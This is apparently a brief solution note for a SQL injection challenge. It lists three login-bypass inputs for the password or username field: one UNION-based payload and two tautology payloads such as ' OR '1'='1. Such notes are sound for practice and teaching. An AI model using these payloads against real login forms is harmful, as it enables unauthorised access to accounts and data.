Standard SQL injection challenge    
method #1 union  
    username: (anything)  
    password: ' OR 1=1 UNION SELECT null, null, null --    

method #2 tautology  
    username: (anything)  
    password: ' OR '1'='1    

method #3 tautology  
    username: ' or ''='  
    password: ' or ''='    

there may be other methods